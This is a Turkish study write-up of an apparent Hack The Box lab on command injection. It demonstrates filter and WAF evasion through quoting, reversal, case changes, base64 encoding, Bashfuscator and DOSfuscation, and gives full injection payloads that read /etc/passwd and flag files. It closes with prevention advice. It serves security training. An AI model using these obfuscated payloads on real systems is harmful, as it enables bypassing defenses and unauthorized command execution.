Gördüğümüz gibi, kullanıcı girdisinin her bir kelimesini blacklistedeki kelimelerden herhangi biriyle eşleşip eşleşmediğini görmek için kontrol ediyor. Ancak, bu kod verilen komutun tam eşleşmesini aramaktadır, bu nedenle biraz farklı bir komut gönderirsek engellenmeyebilir. Neyse ki, komutumuzu tam komut kelimesini kullanmadan çalıştıracak çeşitli gizleme tekniklerini kullanabiliriz.


## Linux & Windows

Çok yaygın ve kolay bir gizleme tekniği, komutumuzun içine genellikle Bash veya PowerShell gibi komut kabukları tarafından göz ardı edilen ve sanki orada yokmuş gibi aynı komutu çalıştıracak belirli karakterler eklemektir. Bu karakterlerden bazıları tek tırnak ‘ ve çift tırnak “ ve diğer birkaç karakterdir.

Kullanımı en kolay olan tırnak işaretleridir ve hem Linux hem de Windows sunucularında çalışırlar. Örneğin, whoami komutunu gizlemek istiyorsak, karakterleri arasına aşağıdaki gibi tek tırnak işareti ekleyebiliriz:

```shell-session
21y4d@htb[/htb]$ w'h'o'am'i

21y4d
```

Aynı şey çift tırnak işaretleri için de geçerlidir:

```shell-session
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

Hatırlanması gereken önemli şeyler, tırnak türlerini karıştıramayacağımız ve tırnak sayısının çift olması gerektiğidir. Yukarıdakilerden birini payload’umuzda (127.0.0.1%0aw’h’o’am’i) deneyebilir ve çalışıp çalışmadığını görebiliriz:

![Pasted image 20241211025335.png](/img/user/resimler/Pasted%20image%2020241211025335.png)

Gördüğümüz gibi, bu yöntem gerçekten de işe yarıyor.


## Linux Only

Komutların ortasına Linux’a özel birkaç karakter daha ekleyebiliriz ve bash kabuğu bunları görmezden gelerek komutu çalıştırır. Bu karakterler arasında ters eğik çizgi \ ve konumsal parametre karakteri $@ yer alır. Bu aynen tırnak işaretlerinde olduğu gibi çalışır, ancak bu durumda karakterlerin sayısı eşit olmak zorunda değildir ve istersek bunlardan sadece birini ekleyebiliriz:

```bash
who$@ami
w\ho\am\i
```


## Windows Only

Ayrıca, aşağıdaki örnekte görebileceğimiz gibi, komutların ortasına ekleyebileceğimiz ve sonucu etkilemeyen, Windows’a özel bazı karakterler de vardır; örneğin şapka (^) karakteri gibi:

```cmd-session
C:\htb> who^ami

21y4d
```

Bir sonraki bölümde, komut gizleme ve filtre atlama için bazı daha gelişmiş teknikleri tartışacağız.
0

Soru : Bu bölümde öğrendiklerinizi kullanarak daha önce bulduğunuz kullanıcının ana klasöründeki flag.txt dosyasının içeriğini bulun.


Cevap :

1- new-line’nın çalışıp çalışmadığını kontrol edelim .

![Pasted image 20241211031349.png](/img/user/resimler/Pasted%20image%2020241211031349.png)


2- new-line çalışıyor . $IFS ‘in çalışıp çalışmadığını kontrol edelim .

![Pasted image 20241211031411.png](/img/user/resimler/Pasted%20image%2020241211031411.png)



3- Filtreleme olmasaydı eğer cat /home/1nj3c70r/flag.txt yapmamızyeterliydi fakat. Blacklist tahmini olarak cat komutu engelliyor. Ayrıca / operandlarıda engelliyor.

cat → c’a’t → ile atlatıyoruz.

/ → ifadesini ise ${PATH:0:1} ile atlatıyoruz. Payloadımız şu şekildedir.

![Pasted image 20241211031431.png](/img/user/resimler/Pasted%20image%2020241211031431.png)



## Gelişmiş Komut Gizleme

Bazı durumlarda, Web Uygulaması Güvenlik Duvarları (WAF’lar) gibi gelişmiş filtreleme çözümleriyle uğraşıyor olabiliriz ve temel kaçınma teknikleri her zaman işe yaramayabilir. Bu gibi durumlarda, enjekte edilen komutların tespit edilme olasılığını çok daha düşük hale getiren daha gelişmiş teknikler kullanabiliriz.


## Case Manipulation

Kullanabileceğimiz bir komut gizleme tekniği, bir komutun karakter durumlarını tersine çevirmek (örneğin WHOAMI) veya durumlar arasında geçiş yapmak (örneğin WhOaMi) gibi durum manipülasyonudur. Bu genellikle işe yarar çünkü Linux sistemleri büyük/küçük harfe duyarlı olduğu için bir komut blacklist tek bir kelimenin farklı büyük/küçük harf varyasyonlarını kontrol etmeyebilir.

Bir Windows sunucusuyla uğraşıyorsak, komutun karakterlerinin büyük/küçük harflerini değiştirebilir ve gönderebiliriz. Windows’ta PowerShell ve CMD komutları büyük/küçük harfe duyarsızdır, yani hangi harfle yazıldığına bakılmaksızın komutu çalıştırırlar:

```powershell-session
PS C:\htb> WhOaMi

21y4d
```

Ancak, söz konusu Linux ve bash shell'i olduğunda, daha önce de belirtildiği gibi, büyük/küçük harfe duyarlı olduğundan, biraz yaratıcı olmamız ve komutu tümüyle küçük harfli bir sözcüğe dönüştüren bir komut bulmamız gerekir. Kullanabileceğimiz işe yarar bir komut aşağıdaki gibidir:

```shell-session
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

Gördüğümüz gibi, verdiğimiz kelime (WhOaMi) olmasına rağmen komut çalıştı. Bu komut, tüm büyük harfli karakterleri küçük harfli karakterlerle değiştirmek için tr kullanır, bu da tümüyle küçük harfli bir komutla sonuçlanır. Ancak, yukarıdaki komutu Host Checker web uygulaması ile kullanmaya çalışırsak, yine de engellendiğini göreceğiz:

## Burp POST Request

![Pasted image 20241211031622.png](/img/user/resimler/Pasted%20image%2020241211031622.png)

Nedenini tahmin edebilir misiniz? Çünkü yukarıdaki komut, daha önce gördüğümüz gibi web uygulamamızda filtrelenmiş bir karakter olan boşluk içeriyor. Bu nedenle, bu tür tekniklerde, her zaman filtrelenmiş karakterler kullanmadığımızdan emin olmalıyız, aksi takdirde isteklerimiz başarısız olur ve tekniklerin işe yaramadığını düşünebiliriz.

Boşlukları sekmelerle (%09) değiştirdiğimizde, komutun mükemmel bir şekilde çalıştığını görüyoruz:

![Pasted image 20241211031644.png](/img/user/resimler/Pasted%20image%2020241211031644.png)

Aşağıdaki gibi aynı amaçla kullanabileceğimiz başka birçok komut vardır:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```


## Tersine Çevrilmiş Komutlar

Tartışacağımız bir başka komut gizleme tekniği de komutları tersine çevirmek ve onları gerçek zamanlı olarak çalıştıran bir komut şablonuna sahip olmaktır. Bu durumda, blacklisted komutunu tetiklemekten kaçınmak için whoami yerine imaohw yazacağız.

Bu tür tekniklerle yaratıcı olabilir ve sonunda gerçek komut kelimelerini içermeden komutu çalıştıran kendi Linux/Windows komutlarımızı oluşturabiliriz. İlk olarak, terminalimizde komutumuzun ters çevrilmiş dizesini aşağıdaki gibi almamız gerekir:

```shell-session
M1R4CKCK@htb[/htb]$ echo 'whoami' | rev
imaohw
```

Ardından, orijinal komutu aşağıdaki gibi bir alt kabukta ($()) tersine çevirerek çalıştırabiliriz:

```shell-session
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

Komutun gerçek whoami kelimesini içermemesine rağmen aynı şekilde çalıştığını ve beklenen çıktıyı sağladığını görüyoruz. Bu komutu alıştırmamızla da test edebiliriz ve gerçekten de çalışır:

![Pasted image 20241211031758.png](/img/user/resimler/Pasted%20image%2020241211031758.png)

İpucu: Yukarıdaki yöntemle bir karakter filtresini atlamak isterseniz, bunları da tersine çevirmeniz veya orijinal komutu tersine çevirirken dahil etmeniz gerekir.

Aynı şey Windows’ta da uygulanabilir. İlk olarak bir dizeyi aşağıdaki gibi tersine çevirebiliriz:

```powershell-session
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

Artık bir PowerShell alt kabuğu (iex “$()”) ile tersine çevrilmiş bir dizeyi çalıştırmak için aşağıdaki komutu aşağıdaki gibi kullanabiliriz:

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```


## Encoded Commands

Tartışacağımız son teknik, filtrelenmiş karakterler veya sunucu tarafından URL kodu çözülebilecek karakterler içeren komutlar için yararlıdır. Bu, komutun kabuğa ulaştığında karışmasına ve sonunda yürütülememesine neden olabilir. Mevcut bir komutu çevrimiçi olarak kopyalamak yerine, bu kez kendi benzersiz gizleme komutumuzu oluşturmaya çalışacağız. Bu şekilde, bir filtre veya WAF tarafından reddedilme olasılığı çok daha düşüktür. Oluşturacağımız komut, hangi karakterlere izin verildiğine ve sunucudaki güvenlik seviyesine bağlı olarak her durum için benzersiz olacaktır.

Base64 (b64 kodlaması için) veya xxd (hex kodlaması için) gibi çeşitli kodlama araçlarını kullanabiliriz. Örnek olarak base64'ü ele alalım. İlk olarak, çalıştırmak istediğimiz yükü (filtrelenmiş karakterler içeren) kodlayacağız:

```shell-session
M1R4CKCK@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Şimdi kodlanmış dizeyi bir alt kabukta ($()) çözecek ve ardından çalıştırılmak üzere bash’e iletecek (yani bash<<<) bir komut oluşturabiliriz, aşağıdaki gibi:

```shell-session
M1R4CKCK@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Gördüğümüz gibi, yukarıdaki komut komutu mükemmel bir şekilde çalıştırıyor. Herhangi bir filtrelenmiş karakter eklemedik ve komutun yürütülememesine neden olabilecek kodlanmış karakterlerden kaçındık.

İpucu: Filtrelenmiş bir karakter olan pipe | karakterini kullanmaktan kaçınmak için <<< kullandığımıza dikkat edin.

Şimdi bu komutu (boşlukları değiştirdikten sonra) komut enjeksiyonu yoluyla aynı komutu çalıştırmak için kullanabiliriz:

![Pasted image 20241211032030.png](/img/user/resimler/Pasted%20image%2020241211032030.png)

Bash veya base64 gibi bazı komutlar filtrelenmiş olsa bile, önceki bölümde tartıştığımız tekniklerle (örneğin, karakter ekleme) bu filtreyi atlayabilir veya komut yürütme için sh ve b64 kod çözme için openssl veya hex kod çözme için xxd gibi diğer alternatifleri kullanabiliriz.

Aynı tekniği Windows için de kullanacağız. İlk olarak, string'imizi aşağıdaki gibi base64 kodlamamız gerekir:

```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

Aynı şeyi Linux’ta da başarabiliriz, ancak dizeyi base64 yapmadan önce utf-8'den utf-16'ya aşağıdaki gibi dönüştürmemiz gerekir:

```shell-session
M1R4CKCK@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Son olarak, b64 dizesinin kodunu çözebilir ve aşağıdaki gibi bir PowerShell alt kabuğu (iex “$()”) ile çalıştırabiliriz:

```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

Gördüğümüz gibi, Bash veya PowerShell ile yaratıcı olabilir ve daha önce kullanılmamış ve dolayısıyla filtreleri ve WAF’ları atlatma olasılığı çok yüksek olan yeni atlatma ve gizleme yöntemleri oluşturabiliriz.

Bahsettiğimiz tekniklere ek olarak, joker karakterler, regex, çıktı yeniden yönlendirme, tamsayı genişletme ve diğerleri gibi çok sayıda başka yöntem de kullanabiliriz. Bu tür bazı teknikleri [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)’de bulabiliriz.



Soru : Bu bölümde öğrendiğiniz tekniklerden birini kullanarak aşağıdaki komutun çıktısını bulun: find /usr/share/ | grep root | grep mysql | tail -n 1


cevap :

1- İlk olarak ters çevirmeyi denedim fakat ters çevirme uzun kodlarda stabil çalışmıyor. Bunun için base64 kodlama sistemini denedim . Önceki ifadelerimizi tekrar edelim.

`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`

Payloadını düzenliyelim .

2- bash komutu hedef sistemde blacklistede olabilir . Onun için b’as’h olarak alabiliriz.

3- “<<<” ifadesi zaten | pipe yerini tutuğu için bunu değiştirmeyelim.

4- “-d” den önce boşluk var boşluğu {IFS} ile değiştirelim.

Son olarak payloadımız şu şekilde.

`127.0.0.1%0ab'as'h<<<$(ba'se6'4${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)`


5- Payloadımızı deneyelim.

![Pasted image 20241211032556.png](/img/user/resimler/Pasted%20image%2020241211032556.png)

6- Payloadımız çalıştı sorumuzun cevabını aldık . Ayrıca ‘ işareti yerine @$ ifadesini veya “ işareti gibi alternatiflerde kullanılabilir .


## Evasion Tools

Gelişmiş güvenlik araçlarıyla uğraşıyorsak, temel, manuel şaşırtma tekniklerini kullanamayabiliriz. Bu gibi durumlarda, otomatik şaşırtma araçlarına başvurmak en iyisi olabilir. Bu bölümde, biri Linux diğeri Windows için olmak üzere bu tür araçların birkaç örneği ele alınacaktır.


## Linux (Bashfuscator)

Bash komutlarını gizlemek için kullanabileceğimiz kullanışlı bir araç [Bashfuscator’dır](https://github.com/Bashfuscator/Bashfuscator). GitHub’dan depoyu klonlayabilir ve ardından aşağıdaki gibi gereksinimlerini yükleyebiliriz:

![Pasted image 20241211032645.png](/img/user/resimler/Pasted%20image%2020241211032645.png)

Aracı kurduktan sonra ./bashfuscator/bin/ dizininden kullanmaya başlayabiliriz. h yardım menüsünde görebileceğimiz gibi, nihai gizlenmiş komutumuza ince ayar yapmak için araçla birlikte kullanabileceğimiz birçok bayrak vardır:

```shell-session
M1R4CKCK@htb[/htb]$ cd ./bashfuscator/bin/
M1R4CKCK@htb[/htb]$ ./bashfuscator -h

usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

Basitçe -c bayrağı ile gizlemek istediğimiz komutu sağlayarak başlayabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

Ancak, aracı bu şekilde çalıştırmak rastgele bir karartma tekniği seçecektir ve bu da birkaç yüz karakterden bir milyon karaktere kadar değişen bir komut uzunluğu üretebilir! Bu nedenle, yardım menüsündeki bazı bayrakları kullanarak aşağıdaki gibi daha kısa ve basit bir gizlenmiş komut üretebiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

Şimdi bash -c ‘’ ile çıktısı alınan komutu test edebilir ve istenen komutu çalıştırıp çalıştırmadığını görebiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```


## Windows (DOSfuscation)

Windows için kullanabileceğimiz [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) adında çok benzer bir araç da vardır. Bashfuscator’dan farklı olarak, bu etkileşimli bir araçtır, çünkü bir kez çalıştırırız ve istenen gizlenmiş komutu elde etmek için onunla etkileşime gireriz. Aracı bir kez daha GitHub’dan klonlayabilir ve ardından aşağıdaki gibi PowerShell aracılığıyla çağırabiliriz:

```powershell-session
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

Aracın nasıl çalıştığına dair bir örnek görmek için öğreticiyi bile kullanabiliriz. Bir kez ayarlandıktan sonra, aşağıdaki gibi aracı kullanmaya başlayabiliriz:

```powershell-session
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```



## Komut Enjeksiyonu Önleme

## Sistem Komutları

Sistem komutlarını çalıştıran fonksiyonları kullanmaktan her zaman kaçınmalıyız, özellikle de bu fonksiyonlarla kullanıcı girdisi kullanıyorsak. Bu fonksiyonlara doğrudan kullanıcı girişi yapmıyor olsak bile, bir kullanıcı dolaylı olarak bunları etkileyebilir ve bu da sonuçta bir komut enjeksiyonu güvenlik açığına yol açabilir.

Sistem komut yürütme işlevlerini kullanmak yerine, back-end dilleri genellikle bu tür işlevlerin güvenli uygulamalarına sahip olduğundan, gerekli işlevleri yerine getiren yerleşik işlevleri kullanmalıyız. Örneğin, belirli bir hostun PHP ile canlı olup olmadığını test etmek istediğimizi varsayalım. Bu durumda, bunun yerine keyfi sistem komutlarını çalıştırmak için istismar edilemeyecek olan fsockopen işlevini kullanabiliriz.

Bir sistem komutu çalıştırmamız gerekiyorsa ve aynı işlevi yerine getirecek yerleşik bir işlev bulunamıyorsa, kullanıcı girdisini bu işlevlerle asla doğrudan kullanmamalı, her zaman back-end’de kullanıcı girdisini doğrulamalı ve sterilize etmeliyiz. Ayrıca, bu tür işlevlerin kullanımını mümkün olduğunca sınırlandırmaya çalışmalı ve bunları yalnızca ihtiyaç duyduğumuz işlevsellik için yerleşik bir alternatif olmadığında kullanmalıyız.


## Girdi Doğrulama

PHP’de, diğer birçok web geliştirme dilinde olduğu gibi, e-postalar, URL’ler ve hatta IP’ler gibi çeşitli standart biçimler için filter_var işleviyle aşağıdaki gibi kullanılabilen yerleşik filtreler vardır:

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

Standart olmayan farklı bir formatı doğrulamak istersek, preg_match işleviyle bir Düzenli İfade regex’i kullanabiliriz. Aynı şey hem front-end hem de back-end (yani NodeJS) için JavaScript ile aşağıdaki gibi gerçekleştirilebilir:

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

PHP’de olduğu gibi NodeJS’de de çeşitli standart formatları doğrulamak için kütüphaneler kullanabiliriz, örneğin npm ile yükleyebileceğimiz is-ip gibi ve ardından kodumuzda isIp(ip) fonksiyonunu kullanabiliriz. .NET veya Java gibi diğer dillerin kılavuzlarını okuyarak her bir dilde kullanıcı girdisinin nasıl doğrulanacağını öğrenebilirsiniz.


## Girdi Temizleme

 Girdi sanitizasyonu her zaman girdi doğrulamasından sonra gerçekleştirilir. Sağlanan kullanıcı girdisinin uygun formatta olduğunu doğruladıktan sonra bile, girdi doğrulamanın başarısız olabileceği durumlar (örneğin, kötü bir regex) olduğundan, yine de sanitizasyon yapmalı ve belirli format için gerekli olmayan tüm özel karakterleri kaldırmalıyız.

Örnek kodumuzda, karakter ve komut filtreleriyle uğraşırken, belirli kelimeleri blacklist’e aldığını ve bunları kullanıcı girdisinde aradığını gördük. Genel olarak bu, enjeksiyonları önlemek için yeterince iyi bir yaklaşım değildir ve özel karakterleri kaldırmak için yerleşik işlevleri kullanmalıyız. Kullanıcı girdisinden herhangi bir özel karakteri kaldırmak için preg_replace’i aşağıdaki gibi kullanabiliriz:

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```


Gördüğümüz gibi, yukarıdaki regex yalnızca alfanümerik karakterlere (A-Za-z0–9) izin verir ve IP’ler için gerektiği gibi bir nokta karakterine (.) izin verir. Diğer tüm karakterler dizeden çıkarılacaktır. Aynı şey JavaScript ile aşağıdaki gibi yapılabilir:

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

DOMPurify kütüphanesini aşağıdaki gibi bir NodeJS back-end için de kullanabiliriz:

```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

Bazı durumlarda, tüm özel karakterlere izin vermek isteyebiliriz (örneğin, kullanıcı yorumları), o zaman girdi doğrulamada kullandığımız aynı filter_var işlevini kullanabilir ve herhangi bir özel karakterden kaçmak için escapeshellcmd filtresini kullanabiliriz, böylece herhangi bir enjeksiyona neden olamazlar. NodeJS için sadece escape(ip) fonksiyonunu kullanabiliriz. Ancak, bu modülde gördüğümüz gibi, özel karakterlerden kaçmak genellikle güvenli bir uygulama olarak kabul edilmez, çünkü genellikle çeşitli tekniklerle atlanabilir.

## Sunucu Yapılandırması

Son olarak, web sunucusunun tehlikeye girmesi durumunda etkiyi azaltmak için back-end sunucumuzun güvenli bir şekilde yapılandırıldığından emin olmalıyız. Uygulayabileceğimiz konfigürasyonlardan bazıları şunlardır:

- Harici bir WAF’a (örneğin Cloudflare, Fortinet, Imperva…) ek olarak web sunucusunun yerleşik Web Uygulaması Güvenlik Duvarı’nı (örneğin Apache mod_security’de) kullanın
- Web sunucusunu düşük ayrıcalıklı bir kullanıcı (ör. www-data) olarak çalıştırarak En Az Ayrıcalık İlkesine (PoLP) uyun
- Belirli işlevlerin web sunucusu tarafından yürütülmesini engelleyin (örneğin, PHP disable_functions=system,…)
- Web uygulaması tarafından erişilebilen kapsamı kendi klasörüyle sınırlayın (örneğin PHP’de open_basedir = ‘/var/www/html’)
- URL’lerde çift kodlu istekleri ve ASCII olmayan karakterleri reddetme
- Hassas/eski kütüphanelerin ve modüllerin kullanımından kaçının (örn. PHP CGI)


Sonunda, tüm bu güvenlik azaltma ve yapılandırmalarından sonra bile, herhangi bir web uygulaması işlevinin hala komut enjeksiyonuna karşı savunmasız olup olmadığını görmek için bu yazıda öğrendiğimiz sızma testi tekniklerini uygulamamız gerekir. Bazı web uygulamalarında milyonlarca satır kod bulunduğundan, herhangi bir kod satırındaki tek bir hata güvenlik açığı oluşturmak için yeterli olabilir. Bu nedenle, güvenli kodlama en iyi uygulamalarını kapsamlı sızma testleriyle tamamlayarak web uygulamasını güvence altına almaya çalışmalıyız.


# Skills Assessment

![Pasted image 20241211034201.png](/img/user/resimler/Pasted%20image%2020241211034201.png)

Burp'den move komutunun isteğini yakaladım . 

![Pasted image 20241211034150.png](/img/user/resimler/Pasted%20image%2020241211034150.png)

![Pasted image 20241211034746.png](/img/user/resimler/Pasted%20image%2020241211034746.png)

![Pasted image 20241211035130.png](/img/user/resimler/Pasted%20image%2020241211035130.png)

![Pasted image 20241211035141.png](/img/user/resimler/Pasted%20image%2020241211035141.png)

